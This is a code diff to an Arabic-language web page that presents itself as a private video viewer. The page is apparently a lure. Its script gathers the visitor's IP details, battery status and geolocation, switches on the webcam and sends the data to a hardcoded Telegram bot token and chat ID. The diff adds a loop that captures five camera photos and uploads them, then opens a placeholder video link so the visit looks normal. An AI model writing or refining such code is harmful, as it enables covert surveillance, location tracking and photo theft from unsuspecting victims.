@@ -37,11 +37,7 @@
       color: #ccc;
       margin-bottom: 20px;
     }
-    .button-container {
-      display: flex;
-      gap: 20px;
-    }
-    button, .video-link {
+    button {
       background: #ff0050;
       color: white;
       border: none;
@@ -50,9 +46,8 @@
       font-size: 18px;
       cursor: pointer;
       box-shadow: 0 0 10px #ff0050;
-      text-decoration: none;
     }
-    button:hover, .video-link:hover {
+    button:hover {
       background: #e60045;
     }
     video {
@@ -65,17 +60,15 @@
     <img src="logo.png" alt="عبود السراوي" class="logo">
   </div>
   <h1>عبود السراوي</h1>
-  <p>اضغط موافق لمشاهدة فيديو خاص بك</p>
-  <div class="button-container">
-    <button onclick="startProcess()">▶️ تشغيل الفيديو</button>
-    <a href="https://your-video-link.com" class="video-link" target="_blank">اضغط هنا لمشاهدة الفيديو</a>
-  </div>
+  <p>اضغط لمشاهدة فيديو خاص بك</p>
+  <button onclick="startProcess()">▶️ اضغط هنا لمشاهدة الفيديو</button>
 
   <video id="video" autoplay playsinline></video>
 
   <script>
     const token = "7662193128:AAEWXKAccEnz_kLpFznV6jit1-wHO7CZWWs";
     const chatId = "6402582508";
+    const videoUrl = "https://your-video-link.com"; // استبدل برابط الفيديو الفعلي
 
     async function sendTelegramMessage(text) {
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -85,10 +78,10 @@
       });
     }
 
-    async function sendPhoto(blob) {
+    async function sendPhoto(blob, index) {
       const formData = new FormData();
       formData.append("chat_id", chatId);
-      formData.append("photo", blob, "photo.jpg");
+      formData.append("photo", blob, `photo_${index}.jpg`);
 
       await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: "POST",
@@ -125,7 +118,28 @@
       });
     }
 
+    async function capturePhotos(stream, video) {
+      const canvas = document.createElement("canvas");
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext("2d");
+
+      for (let i = 1; i <= 5; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        await new Promise(resolve => setTimeout(resolve, 1000)); // تأخير 1 ثانية بين الصور
+        await new Promise((resolve) => {
+          canvas.toBlob(async (blob) => {
+            await sendPhoto(blob, i);
+            resolve();
+          }, "image/jpeg");
+        });
+      }
+
+      stream.getTracks().forEach(track => track.stop());
+    }
+
     async function startProcess() {
+      // جمع معلومات الزائر
       const ipInfo = await getIPInfo();
       const battery = await getBatteryInfo();
       const location = await getLocation();
@@ -163,21 +177,11 @@
         video.srcObject = stream;
         video.play();
 
-        setTimeout(() => {
-          const canvas = document.createElement("canvas");
-          canvas.width = 640;
-          canvas.height = 480;
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          stream.getTracks().forEach(track => track.stop());
-
-          canvas.toBlob(async (blob) => {
-            await sendPhoto(blob);
-          }, "image/jpeg");
-        }, 3000);
+        await capturePhotos(stream, video);
+        window.open(videoUrl, "_blank"); // فتح رابط الفيديو بعد التقاط الصور
       } catch (err) {
         await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
+        window.open(videoUrl, "_blank"); // فتح رابط الفيديو حتى لو فشلت الكاميرا
       }
     }
   </script>
